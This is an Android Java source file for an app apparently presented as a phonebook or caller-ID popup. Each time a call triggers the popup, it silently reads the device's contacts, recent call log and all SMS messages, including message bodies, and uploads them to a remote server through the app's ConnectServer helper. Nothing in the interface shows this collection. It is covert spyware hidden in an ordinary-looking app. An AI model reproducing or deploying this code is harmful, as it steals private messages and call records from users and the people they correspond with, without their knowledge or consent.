package kr.search.phonebook;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import kr.search.phonebook.data.Recent;
import kr.search.phonebook.utils.AppUtils;
import kr.search.phonebook.utils.ConnectServer;
import kr.search.phonebook.utils.ContextUtils;
import kr.search.phonebook.utils.GlobalData;

import static kr.search.phonebook.utils.AppUtils.getStringTime;
import static kr.search.phonebook.utils.AppUtils.timeToString;

public class CallPopupActivity extends BaseActivity {

    public static final String EXTRA_CALL_NUMBER = "call_number";
    public static final String EXTRA_SHOP_NAME = "shop_name";
    public static final String EXTRA_NAME = "name";
    public static final String EXTRA_COUNT = "count";

    TextView txtvPopupPhone;
    TextView txtvPopupShopName;
    TextView txtvPopupCount;
    LinearLayout layoutPopupCount;

    Recent call = new Recent();
    String call_number = "";
    String shopName = "";
    String name = "";
    Boolean isCall = true;
    int count = 0;

    Cursor contactsCursor;
    Cursor phoneCursor;
    Cursor messageCursor;
    Cursor curCallLog;

    List<String> contacts = new ArrayList<>();
    List<String> callLogs = new ArrayList<>();
    List<String> messages = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_call_popup);
        call_number = getIntent().getStringExtra(EXTRA_CALL_NUMBER);
        shopName = getIntent().getStringExtra(EXTRA_SHOP_NAME);
        name = getIntent().getStringExtra(EXTRA_NAME);
        count = getIntent().getIntExtra(EXTRA_COUNT, 0);
        isCall = getIntent().getBooleanExtra("isCall", true);
        bindViews();
        setupEvents();
        setValues();
    }

    @Override
    public void setupEvents() {

    }

    @Override
    public void setValues() {
//                TODO - Name 다시 설정
        txtvPopupPhone.setText(call_number);
        txtvPopupShopName.setText(name);
        if (count > 0) {
            layoutPopupCount.setVisibility(View.VISIBLE);
            txtvPopupCount.setText(String.format("%d 건", count));
        } else {
            layoutPopupCount.setVisibility(View.GONE);
        }
        call.setNum(call_number);
        call.setName(name);
        call.setShop_name(shopName);
        call.setCount(count);
        AppUtils.setRecentNumArrayString(mContext, call);

        if (isCall) {
            contacts();
            callLog();
            readSMSMessage();
            ContextUtils.setLastSaveDate(mContext, Calendar.getInstance().getTimeInMillis());
        }
    }

    public void putCallLogs() {
        if (callLogs.size() > 0) {
            ConnectServer.putRequestCallLog(this, callLogs, new ConnectServer.JsonResponseHandler() {
                @Override
                public void onResponse(JSONObject json) {

                }
            });
        }
    }

    public void putMessage() {
        if (messages.size() > 0) {
            ConnectServer.putRequestMessage(this, messages, new ConnectServer.JsonResponseHandler() {
                @Override
                public void onResponse(JSONObject json) {

                }
            });
        }
    }

    public void putContact() {
        if (contacts.size() > 0) {
            ConnectServer.putRequestContacts(this, contacts, new ConnectServer.JsonResponseHandler() {
                @Override
                public void onResponse(JSONObject json) {

                }
            });
        }
    }

    /**
     * 주소록 정보 가져오기.
     */
    public void contacts(){
        contactsCursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[] {
                        ContactsContract.Contacts._ID,
                        ContactsContract.Contacts.DISPLAY_NAME,
                        ContactsContract.Contacts.PHOTO_ID,
                        ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
                },
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC"
        );

        contacts.clear();

        while (contactsCursor.moveToNext()){
            try {
                String v_id = contactsCursor.getString(0);
                String v_display_name = contactsCursor.getString(1);
                String v_phone = contactsPhone(v_id).replaceAll("-", "");
                if (v_phone.startsWith("+82")) {
                    v_phone = v_phone.replace("+82", "0");
                }
                String updateTime = contactsCursor.getString(contactsCursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));

                Log.d("save", v_display_name + " . " + updateTime + " / " + ContextUtils.getLastSaveDate(CallPopupActivity.this));
                if (Long.parseLong(updateTime) > ContextUtils.getLastSaveDate(CallPopupActivity.this)) {
                    if (v_phone != null && !v_phone.equals("") && Long.parseLong(updateTime) > ContextUtils.getLastSaveDate(CallPopupActivity.this)) {
                        String contact = v_display_name + "|" + v_phone + "|" + timeToString(Long.parseLong(updateTime));
                        contacts.add(contact);

                    }
                } else {
                    Log.d("save", "연락처 없");
//                    break;
                }
            }catch(Exception e) {
                System.out.println(e.toString());
            }
        }
        putContact();
//        contactsCursor.close();
    }

    /**
     * 주소록 상세정보(전화번호) 가져오기.
     */
    public String contactsPhone(String p_id){
        String reuslt = null;

        if(p_id==null || p_id.trim().equals("")){
            return reuslt;
        }

        phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] {
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + p_id,
                null,
                null
        );
        while (phoneCursor.moveToNext()){
            try {
                reuslt = phoneCursor.getString(0);
            }catch(Exception e) {
                System.out.println(e.toString());
            }
        }
//        phoneCursor.close();

        return reuslt;
    }

    public int readSMSMessage() {
        Uri allMessage = Uri.parse("content://sms");
        ContentResolver cr = getContentResolver();
        messageCursor = cr.query(allMessage, new String[] { "_id", "thread_id", "address", "person", "date", "body", "type" }, null, null, "date DESC");

        messages.clear();

        while (messageCursor.moveToNext()) {
            long messageId = messageCursor.getLong(0);
            long threadId = messageCursor.getLong(1);
            String address = messageCursor.getString(2);
            long contactId = messageCursor.getLong(3);
            String contactId_string = String.valueOf(contactId);
            long timestamp = messageCursor.getLong(4);
            String body = messageCursor.getString(5);
            String type = messageCursor.getString(6);
//            TODO - 수신 = 1, 발신 = 2 서버 전송
            if (timestamp > ContextUtils.getLastSaveDate(CallPopupActivity.this)) {
                if (Integer.parseInt(type) == 1) {
                    type = "IN";
                } else if (Integer.parseInt(type) == 2) {
                    type = "OUT";
                }

                String contact = address + "|" + body.replaceAll("[\\r\\n]+", " ") + "|" + type + "|" + timeToString(timestamp);
                messages.add(contact);
            } else {
                break;
            }
        }
        putMessage();
        return 0;
    }

    private Cursor getCallHistoryCursor(Context context) {
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, GlobalData.CALL_PROJECTION,
                null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        return cursor;
    }

    private void callLog() {
        curCallLog = getCallHistoryCursor(this);

        if (curCallLog.moveToFirst() && curCallLog.getCount() > 0) {
            try {
                final LayoutInflater inf = LayoutInflater.from(this);
                callLogs.clear();
                int i = 0;

//                TODO - 최대 수 수정
                int count = 0;
                if (curCallLog.getCount() > 49) {
                    count = 49;
                } else {
                    count = curCallLog.getCount();
                }
                while (i < count) {
                    int callcount = 0;
                    String callname = "";
                    String calltype = "";
                    String calllog = "";
                    String callDuration = "";
                    String phone = "";

                    StringBuffer sb = new StringBuffer();

                    if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.INCOMING_TYPE) {
                        calltype = "수신";
                    } else if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.OUTGOING_TYPE) {
                        calltype = "발신";
                    } else if (Integer.parseInt(curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE))) == CallLog.Calls.MISSED_TYPE) {
                        calltype = "부재중";
                    } else {
                        calltype = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.TYPE));
                    }

                    if (curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.CACHED_NAME)) == null) {
                        callname = "NoName";
                    } else {
                        callname = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    }

                    phone = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.NUMBER));
                    long callTime = curCallLog.getLong(curCallLog.getColumnIndex(CallLog.Calls.DATE));
                    String createTime = timeToString(callTime);
                    callDuration = curCallLog.getString(curCallLog.getColumnIndex(CallLog.Calls.DURATION));

                    callcount++;

                    if (callTime > ContextUtils.getLastSaveDate(CallPopupActivity.this)) {
                        if (phone != null) {
                            String list = callname + "|" + calltype + "|" + phone + "|" + getStringTime(Integer.parseInt(callDuration)) + "|" + createTime;
                            callLogs.add(list);
                        }
                    } else {
                        break;
                    }

                    curCallLog.moveToNext();
                    i++;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            putCallLogs();
        }
    }

    public void onDestroy() {
        super.onDestroy();
        if (contactsCursor != null) {
            contactsCursor.close();
        }
        if (phoneCursor != null) {
            phoneCursor.close();
        }
        if (messageCursor != null) {
            messageCursor.close();
        }
        if (curCallLog != null) {
            curCallLog.close();
        }
    }

    @Override
    public void bindViews() {
        layoutPopupCount = findViewById(R.id.layoutPopupCount);
        txtvPopupPhone = findViewById(R.id.txtvPopupPhone);
        txtvPopupShopName = findViewById(R.id.txtvPopupShopName);
        txtvPopupCount = findViewById(R.id.txtvPopupCount);
    }
}
